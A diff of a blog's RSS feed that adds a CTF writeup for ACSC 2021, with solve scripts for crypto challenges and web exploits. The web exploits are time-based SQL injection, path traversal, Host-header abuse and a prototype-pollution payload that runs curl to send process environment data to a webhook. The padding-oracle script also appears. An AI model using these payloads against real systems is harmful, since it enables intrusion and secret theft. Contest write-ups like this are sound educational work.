@@ -1,4 +1,294 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>crypto | Lam Nguyen's blog</title><link>https://lamnhh.github.io/tag/crypto/</link><atom:link href="https://lamnhh.github.io/tag/crypto/index.xml" rel="self" type="application/rss+xml"/><description>crypto</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Sun, 19 Sep 2021 00:00:00 +0000</lastBuildDate><image><url>https://lamnhh.github.io/media/icon_hua2ec155b4296a9c9791d015323e16eb5_11927_512x512_fill_lanczos_center_3.png</url><title>crypto</title><link>https://lamnhh.github.io/tag/crypto/</link></image><item><title>ACSC 2021 writeups</title><link>https://lamnhh.github.io/post/2021-09-20-acsc2021/</link><pubDate>Sun, 19 Sep 2021 00:00:00 +0000</pubDate><guid>https://lamnhh.github.io/post/2021-09-20-acsc2021/</guid><description>&lt;p>owo&lt;/p></description></item><item><title>Recover public keys from JWTs signed using RS256</title><link>https://lamnhh.github.io/post/2021-02-22-jwt-rs256-recover-public-key/</link><pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate><guid>https://lamnhh.github.io/post/2021-02-22-jwt-rs256-recover-public-key/</guid><description>&lt;h1 id="scenario">Scenario&lt;/h1>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>crypto | Lam Nguyen's blog</title><link>https://lamnhh.github.io/tag/crypto/</link><atom:link href="https://lamnhh.github.io/tag/crypto/index.xml" rel="self" type="application/rss+xml"/><description>crypto</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Sun, 19 Sep 2021 00:00:00 +0000</lastBuildDate><image><url>https://lamnhh.github.io/media/icon_hua2ec155b4296a9c9791d015323e16eb5_11927_512x512_fill_lanczos_center_3.png</url><title>crypto</title><link>https://lamnhh.github.io/tag/crypto/</link></image><item><title>ACSC 2021 writeups</title><link>https://lamnhh.github.io/post/2021-09-20-acsc2021/</link><pubDate>Sun, 19 Sep 2021 00:00:00 +0000</pubDate><guid>https://lamnhh.github.io/post/2021-09-20-acsc2021/</guid><description>&lt;p>I competed in ACSC 2021 and got #16 (#2 VN). I &lt;del>overkilled&lt;/del> did web and crypto, and here are the writeups.&lt;/p>
+&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
+&lt;ol>
+&lt;li>
+&lt;p>&lt;a href="#crypto">Crypto&lt;/a>&lt;/p>
+&lt;p>1.1. &lt;a href="#rsa-stream">RSA Stream&lt;/a>&lt;/p>
+&lt;p>1.2. &lt;a href="#cbcbc">CBCBC&lt;/a>&lt;/p>
+&lt;p>1.3. &lt;a href="#secret-saver">Secret Saver&lt;/a>&lt;/p>
+&lt;p>1.4. &lt;a href="#swap-on-curve">Swap on Curve&lt;/a>&lt;/p>
+&lt;p>1.5. &lt;a href="#two-rabin">Two Rabin&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;a href="#web">Web&lt;/a>&lt;/p>
+&lt;p>2.1. &lt;a href="#api">API&lt;/a>&lt;/p>
+&lt;p>2.2. &lt;a href="#favorite-emojis">Favorite Emojis&lt;/a>&lt;/p>
+&lt;p>2.3. &lt;a href="#cowsay-as-a-service">Cowsay as a Service&lt;/a>&lt;/p>
+&lt;/li>
+&lt;/ol>
+&lt;h2 id="crypto">Crypto&lt;/h2>
+&lt;p>The function &lt;code>small_roots&lt;/code> below are from &lt;a href="https://github.com/defund/coppersmith/blob/master/coppersmith.sage" target="_blank" rel="noopener">https://github.com/defund/coppersmith/blob/master/coppersmith.sage&lt;/a>&lt;/p>
+&lt;h3 id="rsa-stream">RSA Stream&lt;/h3>
+&lt;p>We are given $m^{65537}$ and $m^{65539}$ and we need to compute $m$. Here&amp;rsquo;s the firsts overkill:&lt;/p>
+&lt;ul>
+&lt;li>I first computed $m^2 = (\text{flag} \cdot 256^{255 - 97} + \text{pad})^2$.&lt;/li>
+&lt;li>$\text{flag}$ has length $97 &amp;lt; \frac{256}{2}$ so I use Coppersmith to solve the equation above.&lt;/li>
+&lt;/ul>
+&lt;pre>&lt;code class="language-python">from Crypto.Util.number import isPrime, bytes_to_long, long_to_bytes, inverse
+from Crypto.Util.Padding import pad
+n = 30004084769852356813752671105440339608383648259855991408799224369989221653141334011858388637782175392790629156827256797420595802457583565986882788667881921499468599322171673433298609987641468458633972069634856384101309327514278697390639738321868622386439249269795058985584353709739777081110979765232599757976759602245965314332404529910828253037394397471102918877473504943490285635862702543408002577628022054766664695619542702081689509713681170425764579507127909155563775027797744930354455708003402706090094588522963730499563711811899945647475596034599946875728770617584380135377604299815872040514361551864698426189453
+e = 65537
+f = open(&amp;quot;chal.py&amp;quot;, &amp;quot;rb&amp;quot;).read()
+ct = open(&amp;quot;chal.enc&amp;quot;, &amp;quot;rb&amp;quot;).read()
+em = []
+for a in range(0, len(f), 256):
+q = f[a:a+256]
+if len(q) &amp;lt; 256:
+q = pad(q, 256)
+q = bytes_to_long(q)
+c = bytes_to_long(ct[a:a + 256])
+stream = c ^^ q
+em.append(stream)
+flag_len = 97
+m2 = em[1] * inverse(em[0], n) % n
+m = b&amp;quot;ASCS{}&amp;quot;
+m = pad(m, 255)
+m = bytes_to_long(m)
+padding = b&amp;quot;\0&amp;quot; * flag_len
+padding = bytes_to_long(pad(padding, 255))
+R = Integers(n)
+P.&amp;lt;x&amp;gt; = PolynomialRing(R, 1)
+F = (x * 256^(255 - flag_len) + padding)^2 - m2
+m = small_roots(F, (256^flag_len,), m=4, d=4)[0][0]
+print(long_to_bytes(m))
+&lt;/code>&lt;/pre>
+&lt;h3 id="cbcbc">CBCBC&lt;/h3>
+&lt;p>It&amp;rsquo;s a simple padding oracle. We can use &lt;code>iv1&lt;/code> to recover first block, and &lt;code>iv2&lt;/code> to recover second block and that is enough to recover the &lt;code>hidden_username&lt;/code>.&lt;/p>
+&lt;pre>&lt;code class="language-python">from base64 import b64encode, b64decode
+from string import printable
+from pwn import process, remote
+with process([&amp;quot;python3&amp;quot;, &amp;quot;chal.py&amp;quot;]) as tube:
+# with remote(&amp;quot;cbcbc.chal.acsc.asia&amp;quot;, 52171) as tube:
+print(tube.recvuntil(b&amp;quot;=====================================================&amp;quot;).decode())
+print(tube.recvuntil(b&amp;quot;3. Exit&amp;quot;).decode())
+tube.recv()
+tube.sendline(b&amp;quot;1&amp;quot;)
+tube.recv()
+tube.sendline(b&amp;quot;&amp;quot;)
+tube.recvline()
+target_token = b64decode(tube.recvline().strip())
+print(&amp;quot;Target token&amp;quot;, target_token)
+iv1 = target_token[:16]
+iv2 = target_token[16:32]
+enc = target_token[32:]
+enc = enc[:16]
+fail_msg = b&amp;quot;Failed to login! Check your token again&amp;quot;
+def query(iv1: bytes, iv2: bytes, enc: bytes) -&amp;gt; bool:
+token = iv1 + iv2 + enc
+token = b64encode(token)
+tube.recvuntil(b&amp;quot;3. Exit&amp;quot;)
+tube.sendline(b&amp;quot;2&amp;quot;)
+tube.recv()
+tube.sendline(b&amp;quot;mugi&amp;quot;)
+tube.recv()
+tube.sendline(token)
+res = tube.recvline()
+return fail_msg not in res
+ans = bytearray(b&amp;quot;\0&amp;quot; * 16)
+for i in range(15, -1, -1):
+for c in range(256):
+if chr(c ^ (16 - i)) not in printable:
+continue
+new_iv1 = bytearray(iv1)
+new_iv1[i] ^= c
+for j in range(i + 1, 16):
+new_iv1[j] ^= (16 - i) ^ ans[j]
+if query(new_iv1, iv2, enc):
+ans[i] = (c ^ (16 - i))
+break
+print(ans)
+&lt;/code>&lt;/pre>
+&lt;h3 id="secret-saver">Secret Saver&lt;/h3>
+&lt;p>I remember a similar challenge from CryptoHack. The main idea is to submit the payload repeated a few times. If the payload is correct, the compressed data should have the shortest length among all the candidates. From there we can iterate over each character and get the flag.&lt;/p>
+&lt;p>The problem here is how to get the compressed length. I used time-based SQLi to binary search the length. For the first candidate, I search on the whole range $(0-1000)$, suppose its length is $x$, then for the rest I search on range $(x - 10, x + 10)$.&lt;/p>
+&lt;pre>&lt;code class="language-python">import requests
+from string import ascii_letters, digits
+charset = [
+&amp;quot;_&amp;lt;&amp;gt;?!+;:.}&amp;quot;,
+digits,
+ascii_letters,
+]
+charset = &amp;quot;&amp;quot;.join(charset)
+url = &amp;quot;http://167.99.77.49/&amp;quot;
+thres = 0.3
+def query(msg: str, vl = 0, vr = 1000) -&amp;gt; int:
+l = vl
+r = vr
+f = -1
+while l &amp;lt;= r:
+mid = (l + r) // 2
+res = requests.post(url, data={
+&amp;quot;name&amp;quot;: f&amp;quot;' || (case when {str(mid).zfill(4)} &amp;lt;= char_length(msg) then sleep({thres}) else '' end) || '&amp;quot;,
+&amp;quot;msg&amp;quot;: msg * 20
+})
+print(res.elapsed.total_seconds())
+if res.elapsed.total_seconds() &amp;gt; thres:
+f = mid
+l = mid + 1
+else:
+r = mid - 1
+return f
+ans = &amp;quot;ACSC{MAK3-CRiME-4TT4CK-GREAT-AGaiN!}&amp;quot;
+for i in range(10):
+len_list = []
+vl = 0
+vr = 1000
+for p in range(len(charset)):
+c = charset[p]
+len_list.append(query(ans + c, vl, vr))
+print(len_list[-1], c)
+if p == 0:
+vl = len_list[-1] - 10
+vr = len_list[-1] + 10
+if len_list[-1] &amp;lt; len_list[0]:
+break
+min_len = min(len_list)
+for p in range(len(charset)):
+if min_len != len_list[p]:
+continue
+c = charset[p]
+ans += c
+break
+print(ans)
+&lt;/code>&lt;/pre>
+&lt;p>This solution took a lot of time to run and it&amp;rsquo;s extremely inconsistent. Luckily the flag is easy to guess so I could know early when the code fails. Also I can edit the charset to catch the target character quicker.&lt;/p>
+&lt;p>After the contest, I learned of a way to use &lt;code>updatexml&lt;/code> to throw error with query value (&lt;a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html%29" target="_blank" rel="noopener">http://www.securityidiots.com/Web-Pentest/SQL-Injection/XPATH-Error-Based-Injection-UpdateXML.html)&lt;/a>.&lt;/p>
+&lt;h3 id="swap-on-curve">Swap on Curve&lt;/h3>
+&lt;p>I did some simple transformations to create a univariate polynomial on $x$.&lt;/p>
+&lt;p>\begin{equation}
+\begin{aligned}
+x^2 &amp;amp;= y^3 + ay + b \\&lt;br>
+\Leftrightarrow x^2 - b &amp;amp;= y^3 + ay \\&lt;br>
+\Rightarrow (x^2 - b)^2 &amp;amp;= (y^3 + ay)^2 \\&lt;br>
+\Leftrightarrow (x^2 - b)^2 &amp;amp;= y^6 + a^2 y^2 + 2ay^4 \\&lt;br>
+\Leftrightarrow (x^2 - b)^2 &amp;amp;= (x^3 + ax + b)^3 + a^2 (x^3 + ax + b) + 2a(x^3 + ax + b)^2
+\end{aligned}
+\end{equation}&lt;/p>
+&lt;p>No idea how &lt;code>.roots()&lt;/code> solved this, but it did.&lt;/p>
+&lt;pre>&lt;code class="language-python">from Crypto.Util.number import long_to_bytes
+p = 10224339405907703092027271021531545025590069329651203467716750905186360905870976608482239954157859974243721027388367833391620238905205324488863654155905507
+a = 4497571717921592398955060922592201381291364158316041225609739861880668012419104521771916052114951221663782888917019515720822797673629101617287519628798278
+b = 1147822627440179166862874039888124662334972701778333205963385274435770863246836847305423006003688412952676893584685957117091707234660746455918810395379096
+EC = EllipticCurve(GF(p), [a, b])
+P.&amp;lt;x&amp;gt; = PolynomialRing(GF(p))
+Y2 = x^3 + a * x + b
+F = (x^2 - b)^2 - (Y2^3 + a^2 * Y2 + 2 * a * Y2^2)
+cand = []
+for x, _ in F.roots():
+y2 = Y2(x)
+y = y2.sqrt()
+cand.append(x)
+cand.append(y)
+cand.append(-y)
+for x in cand:
+f = long_to_bytes(int(x))
+if b&amp;quot;ACSC&amp;quot; in f:
+print(f)
+&lt;/code>&lt;/pre>
+&lt;h3 id="two-rabin">Two Rabin&lt;/h3>
+&lt;p>The first part is trivial Coppersmith. For the second part, apply Coppersmith short-pad.&lt;/p>
+&lt;p>The code below is taken from &lt;a href="http://mslc.ctf.su/wp/confidence-ctf-2015-rsa1-crypto-400/" target="_blank" rel="noopener">http://mslc.ctf.su/wp/confidence-ctf-2015-rsa1-crypto-400/&lt;/a>&lt;/p>
+&lt;pre>&lt;code class="language-python">flag1_len = 98
+n = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003326444660295787578301365987666679013861017982035560204259777436442969488099
+B = 12408624070212894491872051808326026233625878902991556747856160971787460076467522269639429595067604541456868927539680514190186916845592948405088662144279471
+c1 = 47149257341850631803344907793040624016460864394802627848277699824692112650262968210121452299581667376809654259561510658416826163949830223407035750286554940980726936799838074413937433800942520987785496915219844827204556044437125649495753599550708106983195864758161432571740109614959841908745488347057154186396
+c2 = 38096143360064857625836039270668052307251843760085437365614169441559213241186400206703536344838144000472263634954875924378598171294646491844012132284477949793329427432803416979432652621257006572714223359085436237334735438682570204741205174909769464683299442221434350777366303691294099640097749346031264625862
+flag2_len = 98
+hard_c1 = 73091191827823774495468908722773206641492423784400072752465168109870542883199959598717050676487545742986091081315652284268136739187215026022065778742525832001516743913783423994796457270286069750481789982702001563824813913547627820131760747156379815528428547155422785084878636818919308472977926622234822351389
+hard_c2 = 21303605284622657693928572452692917426184397648451262767916068031147685805357948196368866787751567262515163804299565902544134567172298465831142768549321228087238170761793574794991881327590118848547031077305045920819173332543516073028600540903504720606513570298252979409711977771956104783864344110894347670094
+PRxy.&amp;lt;x,y&amp;gt; = PolynomialRing(Zmod(n))
+PRx.&amp;lt;xn&amp;gt; = PolynomialRing(Zmod(n))
+PRZZ.&amp;lt;xz,yz&amp;gt; = PolynomialRing(Zmod(n))
+g1 = x * (x + B) - hard_c1
+g2 = (x + y) * (x + y + B) - hard_c2
+q1 = g1.change_ring(PRZZ)
+q2 = g2.change_ring(PRZZ)
+h = q2.resultant(q1)
+h = h.univariate_polynomial() # x is hopefully eliminated
+h = h.change_ring(PRx).subs(y=xn)
+h = h.monic()
+print(h)
+roots = h.small_roots(X=2^240, epsilon=0.02)
+print(roots)
+&lt;/code>&lt;/pre>
+&lt;pre>&lt;code class="language-python">from Crypto.Util.number import long_to_bytes
+flag1_len = 98
+flag1_len = 98
+n = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003326444660295787578301365987666679013861017982035560204259777436442969488099
+B = 12408624070212894491872051808326026233625878902991556747856160971787460076467522269639429595067604541456868927539680514190186916845592948405088662144279471
+c1 = 47149257341850631803344907793040624016460864394802627848277699824692112650262968210121452299581667376809654259561510658416826163949830223407035750286554940980726936799838074413937433800942520987785496915219844827204556044437125649495753599550708106983195864758161432571740109614959841908745488347057154186396
+c2 = 38096143360064857625836039270668052307251843760085437365614169441559213241186400206703536344838144000472263634954875924378598171294646491844012132284477949793329427432803416979432652621257006572714223359085436237334735438682570204741205174909769464683299442221434350777366303691294099640097749346031264625862
+flag2_len = 98
+hard_c1 = 73091191827823774495468908722773206641492423784400072752465168109870542883199959598717050676487545742986091081315652284268136739187215026022065778742525832001516743913783423994796457270286069750481789982702001563824813913547627820131760747156379815528428547155422785084878636818919308472977926622234822351389
+hard_c2 = 21303605284622657693928572452692917426184397648451262767916068031147685805357948196368866787751567262515163804299565902544134567172298465831142768549321228087238170761793574794991881327590118848547031077305045920819173332543516073028600540903504720606513570298252979409711977771956104783864344110894347670094
+y = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003324807101635213925825667932900258849901826251288979045274120411473033890824
+R = Integers(n)
+P.&amp;lt;x&amp;gt; = PolynomialRing(R)
+g1 = x * (x + B) - hard_c1
+g2 = (x + y) * (x + y + B) - hard_c2
+while g2:
+g1, g2 = g2, g1 % g2
+g1 = g1.monic()
+m1 = -g1[0]
+m2 = m1 + y
+print(long_to_bytes(int(m2) // (2^240)))
+&lt;/code>&lt;/pre>
+&lt;h2 id="web">Web&lt;/h2>
+&lt;h3 id="api">API&lt;/h3>
+&lt;p>The server does not abort after &amp;ldquo;redirecting&amp;rdquo;, so the admin code is still run. The exploit is as follow:&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>Register account:&lt;/p>
+&lt;pre>&lt;code>Mugi/A123123123
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;li>
+&lt;p>Get passcode:&lt;/p>
+&lt;pre>&lt;code>id=Mugi&amp;amp;pw=A123123123&amp;amp;c=i&amp;amp;c2=gp
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;li>
+&lt;p>Get flag&lt;/p>
+&lt;pre>&lt;code>id=Mugi&amp;amp;pw=A123123123&amp;amp;c=i&amp;amp;c2=gd&amp;amp;pas=:&amp;lt;vNk&amp;amp;db=../../../../../flag
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="favorite-emojis">Favorite Emojis&lt;/h3>
+&lt;ul>
+&lt;li>First, add a query &lt;code>_escaped_fragment_=1&lt;/code> to the URL to get to the &lt;code>renderer&lt;/code> route.&lt;/li>
+&lt;li>Second, my URL is modified to be &lt;code>$host$request_uri&lt;/code>. &lt;code>$host&lt;/code> is taken from the &lt;code>Host&lt;/code> header in the HTTP request.
+&lt;ul>
+&lt;li>I tried &lt;code>Host: api:8000&lt;/code> but it strips the port&lt;/li>
+&lt;li>So I ngrok a local HTTP server that contains a HTML file &lt;code>test.html&lt;/code> that does &lt;code>location = http://api:8000&lt;/code>. The ngrok URL does not contain a port so it isn&amp;rsquo;t stripped.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Final payload:
+&lt;pre>&lt;code>GET /test.html?_escaped_fragment_=1 HTTP/1.1
+Host: f697-1-52-54-122.ngrok.io
+&lt;/code>&lt;/pre>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="cowsay-as-a-service">Cowsay as a Service&lt;/h3>
+&lt;p>It has an obvious prototype pollution vuln. To exploit it, set username to &lt;code>__proto__&lt;/code>, then call the &lt;code>/setting&lt;/code> endpoint.&lt;/p>
+&lt;p>&lt;del>Another overkill incoming.&lt;/del>&lt;/p>
+&lt;p>I polluted the following:&lt;/p>
+&lt;pre>&lt;code class="language-javascript">shell = &amp;quot;/usr/local/bin/node&amp;quot;;
+env = {
+NODE_OPTIONS: &amp;quot;--require /proc/self/environ&amp;quot;,
+payload:
+'require(&amp;quot;child_process&amp;quot;).execSync(\'curl -d &amp;quot;$(cat /proc/1/environ)&amp;quot; webhook\');//',
+};
+&lt;/code>&lt;/pre>
+&lt;p>Run the &lt;code>/cowsay&lt;/code> route and the server will execute the payload and we got the flag.&lt;/p>
+&lt;h2 id="some-2meirl4meirl-thoughts">Some 2meirl4meirl thoughts&lt;/h2>
+&lt;pre>&lt;code class="language-text">&amp;gt; still have an irrational fear of Java.
+&amp;gt; could not solve the 1 non-Java challenge left.
+&amp;gt; could not solve all the non-lattice challenges.
+&amp;gt; what the hell is lattice?
+&amp;gt; why do I overkill so much?
+&amp;gt; pain
+&amp;gt; anyway, hi Greece
+&lt;/code>&lt;/pre></description></item><item><title>Recover public keys from JWTs signed using RS256</title><link>https://lamnhh.github.io/post/2021-02-22-jwt-rs256-recover-public-key/</link><pubDate>Mon, 22 Feb 2021 00:00:00 +0000</pubDate><guid>https://lamnhh.github.io/post/2021-02-22-jwt-rs256-recover-public-key/</guid><description>&lt;h1 id="scenario">Scenario&lt;/h1>
 &lt;p>A web server uses RS256 algorithm for their JWT signing. Both public key and private key are unknown. The adversary can query the server to sign a chosen message. The goal is to recover the public key.&lt;/p>
 &lt;h1 id="how-jwt-works">How JWT works&lt;/h1>
 &lt;p>Take a look at a sample JWT:&lt;/p>
